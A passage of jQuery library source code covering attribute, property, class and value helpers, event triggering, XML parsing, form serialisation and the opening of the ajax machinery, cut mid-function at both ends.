    return access( this, jQuery.attr, name, value, arguments.length > 1 );
},

removeAttr: function( name ) {
    return this.each( function() {
        jQuery.removeAttr( this, name );
    } );
}
} );

jQuery.extend( {
attr: function( elem, name, value ) {
    var ret, hooks,
        nType = elem.nodeType;

    // Don't get/set attributes on text, comment and attribute nodes
    if ( nType === 3 || nType === 8 || nType === 2 ) {
        return;
    }

    // Fallback to prop when attributes are not supported
    if ( typeof elem.getAttribute === "undefined" ) {
        return jQuery.prop( elem, name, value );
    }

    // Attribute hooks are determined by the lowercase version
    // Grab necessary hook if one is defined
    if ( nType !== 1 || !jQuery.isXMLDoc( elem ) ) {
        hooks = jQuery.attrHooks[ name.toLowerCase() ] ||
            ( jQuery.expr.match.bool.test( name ) ? boolHook : undefined );
    }

    if ( value !== undefined ) {
        if ( value === null ) {
            jQuery.removeAttr( elem, name );
            return;
        }

        if ( hooks && "set" in hooks &&
            ( ret = hooks.set( elem, value, name ) ) !== undefined ) {
            return ret;
        }

        elem.setAttribute( name, value + "" );
        return value;
    }

    if ( hooks && "get" in hooks && ( ret = hooks.get( elem, name ) ) !== null ) {
        return ret;
    }

    ret = jQuery.find.attr( elem, name );

    // Non-existent attributes return null, we normalize to undefined
    return ret == null ? undefined : ret;
},

attrHooks: {
    type: {
        set: function( elem, value ) {
            if ( !support.radioValue && value === "radio" &&
                nodeName( elem, "input" ) ) {
                var val = elem.value;
                elem.setAttribute( "type", value );
                if ( val ) {
                    elem.value = val;
                }
                return value;
            }
        }
    }
},

removeAttr: function( elem, value ) {
    var name,
        i = 0,

        // Attribute names can contain non-HTML whitespace characters
        // https://html.spec.whatwg.org/multipage/syntax.html#attributes-2
        attrNames = value && value.match( rnothtmlwhite );

    if ( attrNames && elem.nodeType === 1 ) {
        while ( ( name = attrNames[ i++ ] ) ) {
            elem.removeAttribute( name );
        }
    }
}
} );

// Hooks for boolean attributes
boolHook = {
set: function( elem, value, name ) {
    if ( value === false ) {

        // Remove boolean attributes when set to false
        jQuery.removeAttr( elem, name );
    } else {
        elem.setAttribute( name, name );
    }
    return name;
}
};

jQuery.each( jQuery.expr.match.bool.source.match( /\w+/g ), function( _i, name ) {
var getter = attrHandle[ name ] || jQuery.find.attr;

attrHandle[ name ] = function( elem, name, isXML ) {
    var ret, handle,
        lowercaseName = name.toLowerCase();

    if ( !isXML ) {

        // Avoid an infinite loop by temporarily removing this function from the getter
        handle = attrHandle[ lowercaseName ];
        attrHandle[ lowercaseName ] = ret;
        ret = getter( elem, name, isXML ) != null ?
            lowercaseName :
            null;
        attrHandle[ lowercaseName ] = handle;
    }
    return ret;
};
} );




var rfocusable = /^(?:input|select|textarea|button)$/i,
rclickable = /^(?:a|area)$/i;

jQuery.fn.extend( {
prop: function( name, value ) {
    return access( this, jQuery.prop, name, value, arguments.length > 1 );
},

removeProp: function( name ) {
    return this.each( function() {
        delete this[ jQuery.propFix[ name ] || name ];
    } );
}
} );

jQuery.extend( {
prop: function( elem, name, value ) {
    var ret, hooks,
        nType = elem.nodeType;

    // Don't get/set properties on text, comment and attribute nodes
    if ( nType === 3 || nType === 8 || nType === 2 ) {
        return;
    }

    if ( nType !== 1 || !jQuery.isXMLDoc( elem ) ) {

        // Fix name and attach hooks
        name = jQuery.propFix[ name ] || name;
        hooks = jQuery.propHooks[ name ];
    }

    if ( value !== undefined ) {
        if ( hooks && "set" in hooks &&
            ( ret = hooks.set( elem, value, name ) ) !== undefined ) {
            return ret;
        }

        return ( elem[ name ] = value );
    }

    if ( hooks && "get" in hooks && ( ret = hooks.get( elem, name ) ) !== null ) {
        return ret;
    }

    return elem[ name ];
},

propHooks: {
    tabIndex: {
        get: function( elem ) {

            // Support: IE <=9 - 11 only
            // elem.tabIndex doesn't always return the
            // correct value when it hasn't been explicitly set
            // https://web.archive.org/web/20141116233347/http://fluidproject.org/blog/2008/01/09/getting-setting-and-removing-tabindex-values-with-javascript/
            // Use proper attribute retrieval(#12072)
            var tabindex = jQuery.find.attr( elem, "tabindex" );

            if ( tabindex ) {
                return parseInt( tabindex, 10 );
            }

            if (
                rfocusable.test( elem.nodeName ) ||
                rclickable.test( elem.nodeName ) &&
                elem.href
            ) {
                return 0;
            }

            return -1;
        }
    }
},

propFix: {
    "for": "htmlFor",
    "class": "className"
}
} );

// Support: IE <=11 only
// Accessing the selectedIndex property
// forces the browser to respect setting selected
// on the option
// The getter ensures a default option is selected
// when in an optgroup
// eslint rule "no-unused-expressions" is disabled for this code
// since it considers such accessions noop
if ( !support.optSelected ) {
jQuery.propHooks.selected = {
    get: function( elem ) {

        /* eslint no-unused-expressions: "off" */

        var parent = elem.parentNode;
        if ( parent && parent.parentNode ) {
            parent.parentNode.selectedIndex;
        }
        return null;
    },
    set: function( elem ) {

        /* eslint no-unused-expressions: "off" */

        var parent = elem.parentNode;
        if ( parent ) {
            parent.selectedIndex;

            if ( parent.parentNode ) {
                parent.parentNode.selectedIndex;
            }
        }
    }
};
}

jQuery.each( [
"tabIndex",
"readOnly",
"maxLength",
"cellSpacing",
"cellPadding",
"rowSpan",
"colSpan",
"useMap",
"frameBorder",
"contentEditable"
], function() {
jQuery.propFix[ this.toLowerCase() ] = this;
} );




// Strip and collapse whitespace according to HTML spec
// https://infra.spec.whatwg.org/#strip-and-collapse-ascii-whitespace
function stripAndCollapse( value ) {
    var tokens = value.match( rnothtmlwhite ) || [];
    return tokens.join( " " );
}


function getClass( elem ) {
return elem.getAttribute && elem.getAttribute( "class" ) || "";
}

function classesToArray( value ) {
if ( Array.isArray( value ) ) {
    return value;
}
if ( typeof value === "string" ) {
    return value.match( rnothtmlwhite ) || [];
}
return [];
}

jQuery.fn.extend( {
addClass: function( value ) {
    var classes, elem, cur, curValue, clazz, j, finalValue,
        i = 0;

    if ( isFunction( value ) ) {
        return this.each( function( j ) {
            jQuery( this ).addClass( value.call( this, j, getClass( this ) ) );
        } );
    }

    classes = classesToArray( value );

    if ( classes.length ) {
        while ( ( elem = this[ i++ ] ) ) {
            curValue = getClass( elem );
            cur = elem.nodeType === 1 && ( " " + stripAndCollapse( curValue ) + " " );

            if ( cur ) {
                j = 0;
                while ( ( clazz = classes[ j++ ] ) ) {
                    if ( cur.indexOf( " " + clazz + " " ) < 0 ) {
                        cur += clazz + " ";
                    }
                }

                // Only assign if different to avoid unneeded rendering.
                finalValue = stripAndCollapse( cur );
                if ( curValue !== finalValue ) {
                    elem.setAttribute( "class", finalValue );
                }
            }
        }
    }

    return this;
},

removeClass: function( value ) {
    var classes, elem, cur, curValue, clazz, j, finalValue,
        i = 0;

    if ( isFunction( value ) ) {
        return this.each( function( j ) {
            jQuery( this ).removeClass( value.call( this, j, getClass( this ) ) );
        } );
    }

    if ( !arguments.length ) {
        return this.attr( "class", "" );
    }

    classes = classesToArray( value );

    if ( classes.length ) {
        while ( ( elem = this[ i++ ] ) ) {
            curValue = getClass( elem );

            // This expression is here for better compressibility (see addClass)
            cur = elem.nodeType === 1 && ( " " + stripAndCollapse( curValue ) + " " );

            if ( cur ) {
                j = 0;
                while ( ( clazz = classes[ j++ ] ) ) {

                    // Remove *all* instances
                    while ( cur.indexOf( " " + clazz + " " ) > -1 ) {
                        cur = cur.replace( " " + clazz + " ", " " );
                    }
                }

                // Only assign if different to avoid unneeded rendering.
                finalValue = stripAndCollapse( cur );
                if ( curValue !== finalValue ) {
                    elem.setAttribute( "class", finalValue );
                }
            }
        }
    }

    return this;
},

toggleClass: function( value, stateVal ) {
    var type = typeof value,
        isValidValue = type === "string" || Array.isArray( value );

    if ( typeof stateVal === "boolean" && isValidValue ) {
        return stateVal ? this.addClass( value ) : this.removeClass( value );
    }

    if ( isFunction( value ) ) {
        return this.each( function( i ) {
            jQuery( this ).toggleClass(
                value.call( this, i, getClass( this ), stateVal ),
                stateVal
            );
        } );
    }

    return this.each( function() {
        var className, i, self, classNames;

        if ( isValidValue ) {

            // Toggle individual class names
            i = 0;
            self = jQuery( this );
            classNames = classesToArray( value );

            while ( ( className = classNames[ i++ ] ) ) {

                // Check each className given, space separated list
                if ( self.hasClass( className ) ) {
                    self.removeClass( className );
                } else {
                    self.addClass( className );
                }
            }

        // Toggle whole class name
        } else if ( value === undefined || type === "boolean" ) {
            className = getClass( this );
            if ( className ) {

                // Store className if set
                dataPriv.set( this, "__className__", className );
            }

            // If the element has a class name or if we're passed `false`,
            // then remove the whole classname (if there was one, the above saved it).
            // Otherwise bring back whatever was previously saved (if anything),
            // falling back to the empty string if nothing was stored.
            if ( this.setAttribute ) {
                this.setAttribute( "class",
                    className || value === false ?
                        "" :
                        dataPriv.get( this, "__className__" ) || ""
                );
            }
        }
    } );
},

hasClass: function( selector ) {
    var className, elem,
        i = 0;

    className = " " + selector + " ";
    while ( ( elem = this[ i++ ] ) ) {
        if ( elem.nodeType === 1 &&
            ( " " + stripAndCollapse( getClass( elem ) ) + " " ).indexOf( className ) > -1 ) {
            return true;
        }
    }

    return false;
}
} );




var rreturn = /\r/g;

jQuery.fn.extend( {
val: function( value ) {
    var hooks, ret, valueIsFunction,
        elem = this[ 0 ];

    if ( !arguments.length ) {
        if ( elem ) {
            hooks = jQuery.valHooks[ elem.type ] ||
                jQuery.valHooks[ elem.nodeName.toLowerCase() ];

            if ( hooks &&
                "get" in hooks &&
                ( ret = hooks.get( elem, "value" ) ) !== undefined
            ) {
                return ret;
            }

            ret = elem.value;

            // Handle most common string cases
            if ( typeof ret === "string" ) {
                return ret.replace( rreturn, "" );
            }

            // Handle cases where value is null/undef or number
            return ret == null ? "" : ret;
        }

        return;
    }

    valueIsFunction = isFunction( value );

    return this.each( function( i ) {
        var val;

        if ( this.nodeType !== 1 ) {
            return;
        }

        if ( valueIsFunction ) {
            val = value.call( this, i, jQuery( this ).val() );
        } else {
            val = value;
        }

        // Treat null/undefined as ""; convert numbers to string
        if ( val == null ) {
            val = "";

        } else if ( typeof val === "number" ) {
            val += "";

        } else if ( Array.isArray( val ) ) {
            val = jQuery.map( val, function( value ) {
                return value == null ? "" : value + "";
            } );
        }

        hooks = jQuery.valHooks[ this.type ] || jQuery.valHooks[ this.nodeName.toLowerCase() ];

        // If set returns undefined, fall back to normal setting
        if ( !hooks || !( "set" in hooks ) || hooks.set( this, val, "value" ) === undefined ) {
            this.value = val;
        }
    } );
}
} );

jQuery.extend( {
valHooks: {
    option: {
        get: function( elem ) {

            var val = jQuery.find.attr( elem, "value" );
            return val != null ?
                val :

                // Support: IE <=10 - 11 only
                // option.text throws exceptions (#14686, #14858)
                // Strip and collapse whitespace
                // https://html.spec.whatwg.org/#strip-and-collapse-whitespace
                stripAndCollapse( jQuery.text( elem ) );
        }
    },
    select: {
        get: function( elem ) {
            var value, option, i,
                options = elem.options,
                index = elem.selectedIndex,
                one = elem.type === "select-one",
                values = one ? null : [],
                max = one ? index + 1 : options.length;

            if ( index < 0 ) {
                i = max;

            } else {
                i = one ? index : 0;
            }

            // Loop through all the selected options
            for ( ; i < max; i++ ) {
                option = options[ i ];

                // Support: IE <=9 only
                // IE8-9 doesn't update selected after form reset (#2551)
                if ( ( option.selected || i === index ) &&

                        // Don't return options that are disabled or in a disabled optgroup
                        !option.disabled &&
                        ( !option.parentNode.disabled ||
                            !nodeName( option.parentNode, "optgroup" ) ) ) {

                    // Get the specific value for the option
                    value = jQuery( option ).val();

                    // We don't need an array for one selects
                    if ( one ) {
                        return value;
                    }

                    // Multi-Selects return an array
                    values.push( value );
                }
            }

            return values;
        },

        set: function( elem, value ) {
            var optionSet, option,
                options = elem.options,
                values = jQuery.makeArray( value ),
                i = options.length;

            while ( i-- ) {
                option = options[ i ];

                /* eslint-disable no-cond-assign */

                if ( option.selected =
                    jQuery.inArray( jQuery.valHooks.option.get( option ), values ) > -1
                ) {
                    optionSet = true;
                }

                /* eslint-enable no-cond-assign */
            }

            // Force browsers to behave consistently when non-matching value is set
            if ( !optionSet ) {
                elem.selectedIndex = -1;
            }
            return values;
        }
    }
}
} );

// Radios and checkboxes getter/setter
jQuery.each( [ "radio", "checkbox" ], function() {
jQuery.valHooks[ this ] = {
    set: function( elem, value ) {
        if ( Array.isArray( value ) ) {
            return ( elem.checked = jQuery.inArray( jQuery( elem ).val(), value ) > -1 );
        }
    }
};
if ( !support.checkOn ) {
    jQuery.valHooks[ this ].get = function( elem ) {
        return elem.getAttribute( "value" ) === null ? "on" : elem.value;
    };
}
} );




// Return jQuery for attributes-only inclusion


support.focusin = "onfocusin" in window;


var rfocusMorph = /^(?:focusinfocus|focusoutblur)$/,
stopPropagationCallback = function( e ) {
    e.stopPropagation();
};

jQuery.extend( jQuery.event, {

trigger: function( event, data, elem, onlyHandlers ) {

    var i, cur, tmp, bubbleType, ontype, handle, special, lastElement,
        eventPath = [ elem || document ],
        type = hasOwn.call( event, "type" ) ? event.type : event,
        namespaces = hasOwn.call( event, "namespace" ) ? event.namespace.split( "." ) : [];

    cur = lastElement = tmp = elem = elem || document;

    // Don't do events on text and comment nodes
    if ( elem.nodeType === 3 || elem.nodeType === 8 ) {
        return;
    }

    // focus/blur morphs to focusin/out; ensure we're not firing them right now
    if ( rfocusMorph.test( type + jQuery.event.triggered ) ) {
        return;
    }

    if ( type.indexOf( "." ) > -1 ) {

        // Namespaced trigger; create a regexp to match event type in handle()
        namespaces = type.split( "." );
        type = namespaces.shift();
        namespaces.sort();
    }
    ontype = type.indexOf( ":" ) < 0 && "on" + type;

    // Caller can pass in a jQuery.Event object, Object, or just an event type string
    event = event[ jQuery.expando ] ?
        event :
        new jQuery.Event( type, typeof event === "object" && event );

    // Trigger bitmask: & 1 for native handlers; & 2 for jQuery (always true)
    event.isTrigger = onlyHandlers ? 2 : 3;
    event.namespace = namespaces.join( "." );
    event.rnamespace = event.namespace ?
        new RegExp( "(^|\\.)" + namespaces.join( "\\.(?:.*\\.|)" ) + "(\\.|$)" ) :
        null;

    // Clean up the event in case it is being reused
    event.result = undefined;
    if ( !event.target ) {
        event.target = elem;
    }

    // Clone any incoming data and prepend the event, creating the handler arg list
    data = data == null ?
        [ event ] :
        jQuery.makeArray( data, [ event ] );

    // Allow special events to draw outside the lines
    special = jQuery.event.special[ type ] || {};
    if ( !onlyHandlers && special.trigger && special.trigger.apply( elem, data ) === false ) {
        return;
    }

    // Determine event propagation path in advance, per W3C events spec (#9951)
    // Bubble up to document, then to window; watch for a global ownerDocument var (#9724)
    if ( !onlyHandlers && !special.noBubble && !isWindow( elem ) ) {

        bubbleType = special.delegateType || type;
        if ( !rfocusMorph.test( bubbleType + type ) ) {
            cur = cur.parentNode;
        }
        for ( ; cur; cur = cur.parentNode ) {
            eventPath.push( cur );
            tmp = cur;
        }

        // Only add window if we got to document (e.g., not plain obj or detached DOM)
        if ( tmp === ( elem.ownerDocument || document ) ) {
            eventPath.push( tmp.defaultView || tmp.parentWindow || window );
        }
    }

    // Fire handlers on the event path
    i = 0;
    while ( ( cur = eventPath[ i++ ] ) && !event.isPropagationStopped() ) {
        lastElement = cur;
        event.type = i > 1 ?
            bubbleType :
            special.bindType || type;

        // jQuery handler
        handle = ( dataPriv.get( cur, "events" ) || Object.create( null ) )[ event.type ] &&
            dataPriv.get( cur, "handle" );
        if ( handle ) {
            handle.apply( cur, data );
        }

        // Native handler
        handle = ontype && cur[ ontype ];
        if ( handle && handle.apply && acceptData( cur ) ) {
            event.result = handle.apply( cur, data );
            if ( event.result === false ) {
                event.preventDefault();
            }
        }
    }
    event.type = type;

    // If nobody prevented the default action, do it now
    if ( !onlyHandlers && !event.isDefaultPrevented() ) {

        if ( ( !special._default ||
            special._default.apply( eventPath.pop(), data ) === false ) &&
            acceptData( elem ) ) {

            // Call a native DOM method on the target with the same name as the event.
            // Don't do default actions on window, that's where global variables be (#6170)
            if ( ontype && isFunction( elem[ type ] ) && !isWindow( elem ) ) {

                // Don't re-trigger an onFOO event when we call its FOO() method
                tmp = elem[ ontype ];

                if ( tmp ) {
                    elem[ ontype ] = null;
                }

                // Prevent re-triggering of the same event, since we already bubbled it above
                jQuery.event.triggered = type;

                if ( event.isPropagationStopped() ) {
                    lastElement.addEventListener( type, stopPropagationCallback );
                }

                elem[ type ]();

                if ( event.isPropagationStopped() ) {
                    lastElement.removeEventListener( type, stopPropagationCallback );
                }

                jQuery.event.triggered = undefined;

                if ( tmp ) {
                    elem[ ontype ] = tmp;
                }
            }
        }
    }

    return event.result;
},

// Piggyback on a donor event to simulate a different one
// Used only for `focus(in | out)` events
simulate: function( type, elem, event ) {
    var e = jQuery.extend(
        new jQuery.Event(),
        event,
        {
            type: type,
            isSimulated: true
        }
    );

    jQuery.event.trigger( e, null, elem );
}

} );

jQuery.fn.extend( {

trigger: function( type, data ) {
    return this.each( function() {
        jQuery.event.trigger( type, data, this );
    } );
},
triggerHandler: function( type, data ) {
    var elem = this[ 0 ];
    if ( elem ) {
        return jQuery.event.trigger( type, data, elem, true );
    }
}
} );


// Support: Firefox <=44
// Firefox doesn't have focus(in | out) events
// Related ticket - https://bugzilla.mozilla.org/show_bug.cgi?id=687787
//
// Support: Chrome <=48 - 49, Safari <=9.0 - 9.1
// focus(in | out) events fire after focus & blur events,
// which is spec violation - http://www.w3.org/TR/DOM-Level-3-Events/#events-focusevent-event-order
// Related ticket - https://bugs.chromium.org/p/chromium/issues/detail?id=449857
if ( !support.focusin ) {
jQuery.each( { focus: "focusin", blur: "focusout" }, function( orig, fix ) {

    // Attach a single capturing handler on the document while someone wants focusin/focusout
    var handler = function( event ) {
        jQuery.event.simulate( fix, event.target, jQuery.event.fix( event ) );
    };

    jQuery.event.special[ fix ] = {
        setup: function() {

            // Handle: regular nodes (via `this.ownerDocument`), window
            // (via `this.document`) & document (via `this`).
            var doc = this.ownerDocument || this.document || this,
                attaches = dataPriv.access( doc, fix );

            if ( !attaches ) {
                doc.addEventListener( orig, handler, true );
            }
            dataPriv.access( doc, fix, ( attaches || 0 ) + 1 );
        },
        teardown: function() {
            var doc = this.ownerDocument || this.document || this,
                attaches = dataPriv.access( doc, fix ) - 1;

            if ( !attaches ) {
                doc.removeEventListener( orig, handler, true );
                dataPriv.remove( doc, fix );

            } else {
                dataPriv.access( doc, fix, attaches );
            }
        }
    };
} );
}
var location = window.location;

var nonce = { guid: Date.now() };

var rquery = ( /\?/ );



// Cross-browser xml parsing
jQuery.parseXML = function( data ) {
var xml, parserErrorElem;
if ( !data || typeof data !== "string" ) {
    return null;
}

// Support: IE 9 - 11 only
// IE throws on parseFromString with invalid input.
try {
    xml = ( new window.DOMParser() ).parseFromString( data, "text/xml" );
} catch ( e ) {}

parserErrorElem = xml && xml.getElementsByTagName( "parsererror" )[ 0 ];
if ( !xml || parserErrorElem ) {
    jQuery.error( "Invalid XML: " + (
        parserErrorElem ?
            jQuery.map( parserErrorElem.childNodes, function( el ) {
                return el.textContent;
            } ).join( "\n" ) :
            data
    ) );
}
return xml;
};


var
rbracket = /\[\]$/,
rCRLF = /\r?\n/g,
rsubmitterTypes = /^(?:submit|button|image|reset|file)$/i,
rsubmittable = /^(?:input|select|textarea|keygen)/i;

function buildParams( prefix, obj, traditional, add ) {
var name;

if ( Array.isArray( obj ) ) {

    // Serialize array item.
    jQuery.each( obj, function( i, v ) {
        if ( traditional || rbracket.test( prefix ) ) {

            // Treat each array item as a scalar.
            add( prefix, v );

        } else {

            // Item is non-scalar (array or object), encode its numeric index.
            buildParams(
                prefix + "[" + ( typeof v === "object" && v != null ? i : "" ) + "]",
                v,
                traditional,
                add
            );
        }
    } );

} else if ( !traditional && toType( obj ) === "object" ) {

    // Serialize object item.
    for ( name in obj ) {
        buildParams( prefix + "[" + name + "]", obj[ name ], traditional, add );
    }

} else {

    // Serialize scalar item.
    add( prefix, obj );
}
}

// Serialize an array of form elements or a set of
// key/values into a query string
jQuery.param = function( a, traditional ) {
var prefix,
    s = [],
    add = function( key, valueOrFunction ) {

        // If value is a function, invoke it and use its return value
        var value = isFunction( valueOrFunction ) ?
            valueOrFunction() :
            valueOrFunction;

        s[ s.length ] = encodeURIComponent( key ) + "=" +
            encodeURIComponent( value == null ? "" : value );
    };

if ( a == null ) {
    return "";
}

// If an array was passed in, assume that it is an array of form elements.
if ( Array.isArray( a ) || ( a.jquery && !jQuery.isPlainObject( a ) ) ) {

    // Serialize the form elements
    jQuery.each( a, function() {
        add( this.name, this.value );
    } );

} else {

    // If traditional, encode the "old" way (the way 1.3.2 or older
    // did it), otherwise encode params recursively.
    for ( prefix in a ) {
        buildParams( prefix, a[ prefix ], traditional, add );
    }
}

// Return the resulting serialization
return s.join( "&" );
};

jQuery.fn.extend( {
serialize: function() {
    return jQuery.param( this.serializeArray() );
},
serializeArray: function() {
    return this.map( function() {

        // Can add propHook for "elements" to filter or add form elements
        var elements = jQuery.prop( this, "elements" );
        return elements ? jQuery.makeArray( elements ) : this;
    } ).filter( function() {
        var type = this.type;

        // Use .is( ":disabled" ) so that fieldset[disabled] works
        return this.name && !jQuery( this ).is( ":disabled" ) &&
            rsubmittable.test( this.nodeName ) && !rsubmitterTypes.test( type ) &&
            ( this.checked || !rcheckableType.test( type ) );
    } ).map( function( _i, elem ) {
        var val = jQuery( this ).val();

        if ( val == null ) {
            return null;
        }

        if ( Array.isArray( val ) ) {
            return jQuery.map( val, function( val ) {
                return { name: elem.name, value: val.replace( rCRLF, "\r\n" ) };
            } );
        }

        return { name: elem.name, value: val.replace( rCRLF, "\r\n" ) };
    } ).get();
}
} );


var
r20 = /%20/g,
rhash = /#.*$/,
rantiCache = /([?&])_=[^&]*/,
rheaders = /^(.*?):[ \t]*([^\r\n]*)$/mg,

// #7653, #8125, #8152: local protocol detection
rlocalProtocol = /^(?:about|app|app-storage|.+-extension|file|res|widget):$/,
rnoContent = /^(?:GET|HEAD)$/,
rprotocol = /^\/\//,

/* Prefilters
 * 1) They are useful to introduce custom dataTypes (see ajax/jsonp.js for an example)
 * 2) These are called:
 *    - BEFORE asking for a transport
 *    - AFTER param serialization (s.data is a string if s.processData is true)
 * 3) key is the dataType
 * 4) the catchall symbol "*" can be used
 * 5) execution will start with transport dataType and THEN continue down to "*" if needed
 */
prefilters = {},

/* Transports bindings
 * 1) key is the dataType
 * 2) the catchall symbol "*" can be used
 * 3) selection will start with transport dataType and THEN go to "*" if needed
 */
transports = {},

// Avoid comment-prolog char sequence (#10098); must appease lint and evade compression
allTypes = "*/".concat( "*" ),

// Anchor tag for parsing the document origin
originAnchor = document.createElement( "a" );

originAnchor.href = location.href;

// Base "constructor" for jQuery.ajaxPrefilter and jQuery.ajaxTransport
function addToPrefiltersOrTransports( structure ) {

// dataTypeExpression is optional and defaults to "*"
return function( dataTypeExpression, func ) {

    if ( typeof dataTypeExpression !== "string" ) {
        func = dataTypeExpression;
        dataTypeExpression = "*";
    }

    var dataType,
        i = 0,
        dataTypes = dataTypeExpression.toLowerCase().match( rnothtmlwhite ) || [];

    if ( isFunction( func ) ) {

        // For each dataType in the dataTypeExpression
        while ( ( dataType = dataTypes[ i++ ] ) ) {

            // Prepend if requested
            if ( dataType[ 0 ] === "+" ) {
                dataType = dataType.slice( 1 ) || "*";
                ( structure[ dataType ] = structure[ dataType ] || [] ).unshift( func );

            // Otherwise append
            } else {
                ( structure[ dataType ] = structure[ dataType ] || [] ).push( func );
            }
        }
    }
};
}

// Base inspection function for prefilters and transports
function inspectPrefiltersOrTransports( structure, options, originalOptions, jqXHR ) {

var inspected = {},
    seekingTransport = ( structure === transports );

function inspect( dataType ) {
    var selected;
    inspected[ dataType ] = true;
    jQuery.each( structure[ dataType ] || [], function( _, prefilterOrFactory ) {
        var dataTypeOrTransport = prefilterOrFactory( options, originalOptions, jqXHR );
        if ( typeof dataTypeOrTransport === "string" &&
            !seekingTransport && !inspected[ dataTypeOrTransport ] ) {

            options.dataTypes.unshift( dataTypeOrTransport );
            inspect( dataTypeOrTransport );
            return false;
        } else if ( seekingTransport ) {
            return !( selected = dataTypeOrTransport );
        }
    } );
    return selected;
}

return inspect( options.dataTypes[ 0 ] ) || !inspected[ "*" ] && inspect( "*" );
}

// A special extend for ajax options
// that takes "flat" options (not to be deep extended)
// Fixes #9887
function ajaxExtend( target, src ) {
var key, deep,
    flatOptions = jQuery.ajaxSettings.flatOptions || {};

for ( key in src ) {
    if ( src[ key ] !== undefined ) {
        ( flatOptions[ key ] ? target : ( deep || ( deep = {} ) ) )[ key ] = src[ key ];
    }
}
if ( deep ) {
    jQuery.extend( true, target, deep );
}

return target;
}

/* Handles responses to an ajax request:
* - finds the right dataType (mediates between content-type and expected dataType)
* - returns the corresponding response
*/
function ajaxHandleResponses( s, jqXHR, responses ) {

var ct, type, finalDataType, firstDataType,
    contents = s.contents,
    dataTypes = s.dataTypes;

// Remove auto dataType and get content-type in the process
while ( dataTypes[ 0 ] === "*" ) {
    dataTypes.shift();
    if ( ct === undefined ) {
        ct = s.mimeType || jqXHR.getResponseHeader( "Content-Type" );
    }
}

// Check if we're dealing with a known content-type
if ( ct ) {
    for ( type in contents ) {
        if ( contents[ type ] && contents[ type ].test( ct ) ) {
            dataTypes.unshift( type );
            break;
        }
    }
}

// Check to see if we have a response for the expected dataType
if ( dataTypes[ 0 ] in responses ) {
    finalDataType = dataTypes[ 0 ];
} else {

    // Try convertible dataTypes
    for ( type in responses ) {
        if ( !dataTypes[ 0 ] || s.converters[ type + " " + dataTypes[ 0 ] ] ) {
            finalDataType = type;
            break;
        }
        if ( !firstDataType ) {
            firstDataType = type;
        }
    }

    // Or just use first one
    finalDataType = finalDataType || firstDataType;
}

// If we found a dataType
// We add the dataType to the list if needed
// and return the corresponding response
if ( finalDataType ) {
    if ( finalDataType !== dataTypes[ 0 ] ) {
        dataTypes.unshift( finalDataType );
    }
    return responses[ finalDataType ];
}
}

/* Chain conversions given the request and the original response
* Also sets the responseXXX fields on the jqXHR instance
*/
function ajaxConvert( s, response, jqXHR, isSuccess ) {
var conv2, current, conv, tmp, prev,
    converters = {},

    // Work with a copy of dataTypes in case we need to modify it for conversion
    dataTypes = s.dataTypes.slice();

// Create converters map with lowercased keys
if ( dataTypes[ 1 ] ) {
    for ( conv in s.converters ) {
        converters[ conv.toLowerCase() ] = s.converters[ conv ];
    }
}

current = dataTypes.shift();

// Convert to each sequential dataType
while ( current ) {

    if ( s.responseFields[ current ] ) {
        jqXHR[ s.responseFields[ current ] ] = response;
    }

    // Apply the dataFilter if provided
    if ( !prev && isSuccess && s.dataFilter ) {
        response = s.dataFilter( response, s.dataType );
    }

    prev = current;
    current = dataTypes.shift();

    if ( current ) {

        // There's only work to do if current dataType is non-auto
        if ( current === "*" ) {

            current = prev;

        // Convert response if prev dataType is non-auto and differs from current
        } else if ( prev !== "*" && prev !== current ) {

            // Seek a direct converter
            conv = converters[ prev + " " + current ] || converters[ "* " + current ];

            // If none found, seek a pair
            if ( !conv ) {
                for ( conv2 in converters ) {

                    // If conv2 outputs current
                    tmp = conv2.split( " " );
                    if ( tmp[ 1 ] === current ) {

                        // If prev can be converted to accepted input
                        conv = converters[ prev + " " + tmp[ 0 ] ] ||
                            converters[ "* " + tmp[ 0 ] ];
                        if ( conv ) {

                            // Condense equivalence converters
                            if ( conv === true ) {
                                conv = converters[ conv2 ];

                            // Otherwise, insert the intermediate dataType
                            } else if ( converters[ conv2 ] !== true ) {
                                current = tmp[ 0 ];
                                dataTypes.unshift( tmp[ 1 ] );
                            }
                            break;
                        }
                    }
                }
            }

            // Apply converter (if not an equivalence)
            if ( conv !== true ) {

                // Unless errors are allowed to bubble, catch and return them
                if ( conv && s.throws ) {
                    response = conv( response );
                } else {
                    try {
                        response = conv( response );
                    } catch ( e ) {
                        return {
                            state: "parsererror",
                            error: conv ? e : "No conversion from " + prev + " to " + current
                        };
                    }
                }
            }
        }
    }
}

return { state: "success", data: response };
}

jQuery.extend( {

// Counter for holding the number of active queries
active: 0,

// Last-Modified header cache for next request
lastModified: {},
etag: {},

ajaxSettings: {
    url: location.href,
    type: "GET",
    isLocal: rlocalProtocol.test( location.protocol ),
    global: true,
    processData: true,
    async: true,
    contentType: "application/x-www-form-urlencoded; charset=UTF-8",

    /*
    timeout: 0,
    data: null,
    dataType: null,
    username: null,
    password: null,
    cache: null,
    throws: false,
    traditional: false,
    headers: {},
    */

    accepts: {
        "*": allTypes,
        text: "text/plain",
        html: "text/html",
        xml: "application/xml, text/xml",
        json: "application/json, text/javascript"
    },

    contents: {
        xml: /\bxml\b/,
        html: /\bhtml/,
        json: /\bjson\b/
    },

    responseFields: {
        xml: "responseXML",
        text: "responseText",
        json: "responseJSON"
    },

    // Data converters
    // Keys separate source (or catchall "*") and destination types with a single space
    converters: {

        // Convert anything to text
        "* text": String,

        // Text to html (true = no transformation)
        "text html": true,

        // Evaluate text as a json expression
        "text json": JSON.parse,

        // Parse text as xml
        "text xml": jQuery.parseXML
    },

    // For options that shouldn't be deep extended:
    // you can add your own custom options here if
    // and when you create one that shouldn't be
    // deep extended (see ajaxExtend)
    flatOptions: {
        url: true,
        context: true
    }
},

// Creates a full fledged settings object into target
// with both ajaxSettings and settings fields.
// If target is omitted, writes into ajaxSettings.
ajaxSetup: function( target, settings ) {
    return settings ?

        // Building a settings object
        ajaxExtend( ajaxExtend( target, jQuery.ajaxSettings ), settings ) :

        // Extending ajaxSettings
        ajaxExtend( jQuery.ajaxSettings, target );
},

ajaxPrefilter: addToPrefiltersOrTransports( prefilters ),
ajaxTransport: addToPrefiltersOrTransports( transports ),

// Main method
ajax: function( url, options ) {

    // If url is an object, simulate pre-1.5 signature
    if ( typeof url === "object" ) {
        options = url;
        url = undefined;
    }

    // Force options to be an object
    options = options || {};

    var transport,

        // URL without anti-cache param
        cacheURL,

        // Response headers
        responseHeadersString,
        responseHeaders,

        // timeout handle
        timeoutTimer,

        // Url cleanup var
        urlAnchor,

        // Request state (becomes false upon send and true upon completion)
